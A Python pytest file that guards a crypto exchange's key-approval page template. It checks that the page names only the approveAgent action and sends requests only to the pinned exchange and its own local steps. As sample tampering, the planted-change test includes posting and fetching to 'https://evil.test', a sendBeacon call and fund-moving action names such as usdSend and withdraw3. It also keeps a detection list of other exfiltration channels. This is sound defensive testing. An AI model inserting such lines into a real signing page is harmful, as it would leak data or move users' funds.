from __future__ import annotations

import re

import pytest

from hl_guard.exchange.actions import FORBIDDEN_ACTION_TYPES
from hl_guard.exchange.network import NETWORKS
from hl_guard.keys.approve_page import _PAGE, ApprovePage, approval

from .page_client import get

LOCAL_TARGET = "path + '?t=' + encodeURIComponent(token)"
OTHER_CHANNELS = ("XMLHttpRequest", "sendBeacon", "WebSocket", "EventSource", "<form", "<img")


def template_problems(template: str) -> list[str]:
    lowered = template.lower()
    problems = [
        f"{name} appears {lowered.count(name.lower())} times"
        for name in sorted(FORBIDDEN_ACTION_TYPES)
        if lowered.count(name.lower()) != (name == "approveAgent")
    ]
    targets = sorted(re.findall(r"(?<!function )postJson\(([^,]+),", template))
    if targets != sorted(["exchangeUrl", LOCAL_TARGET]):
        problems.append(f"posts to {targets}")
    paths = sorted(set(re.findall(r"(?:local|allowed)\('([^']*)'", template)))
    if paths != ["/claim", "/result", "/send"]:
        problems.append(f"posts locally to {paths}")
    if template.count("fetch(") != 1 or "const exchangeUrl = $exchange_json;" not in template:
        problems.append("a request leaves outside postJson or exchangeUrl")
    problems += [f"uses {channel}" for channel in OTHER_CHANNELS if channel in template]
    return problems


def test_the_page_names_one_action_type_and_posts_to_the_exchange_and_its_own_steps() -> None:
    assert template_problems(_PAGE.template) == []


@pytest.mark.parametrize(
    "planted",
    [
        "const t = {type: 'usdSend'};",
        "const t = 'withdraw3';",
        "const t = 'ApproveAgent';",
        "postJson('https://evil.test', body);",
        "local('/other', {});",
        "fetch('https://evil.test');",
        "navigator.sendBeacon('/x', '');",
        "const multiSigUser = 1;",
    ],
)
def test_the_guard_catches_a_planted_change(planted: str) -> None:
    assert template_problems(_PAGE.template + planted) != []


def test_the_rendered_page_posts_to_the_pinned_exchange() -> None:
    network = NETWORKS["testnet"]
    a = approval(network, "0x" + "cd" * 20, "0x" + "ab" * 20, days=1, now_ms=1_757_300_000_000)
    served = ApprovePage(a)
    served.start()
    try:
        body = get(served.url)[2]
    finally:
        served.close()
    assert f'const exchangeUrl = "{network.exchange_url}";' in body
